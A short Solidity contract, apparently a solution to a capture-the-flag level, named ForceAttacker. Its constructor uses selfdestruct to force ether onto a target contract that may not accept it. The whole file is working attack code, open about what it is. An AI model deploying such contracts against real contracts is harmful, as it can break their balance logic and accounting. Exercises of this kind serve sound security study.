// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract ForceAttacker {
    constructor(address _instance) public payable {
        selfdestruct(payable(_instance));
    }
}
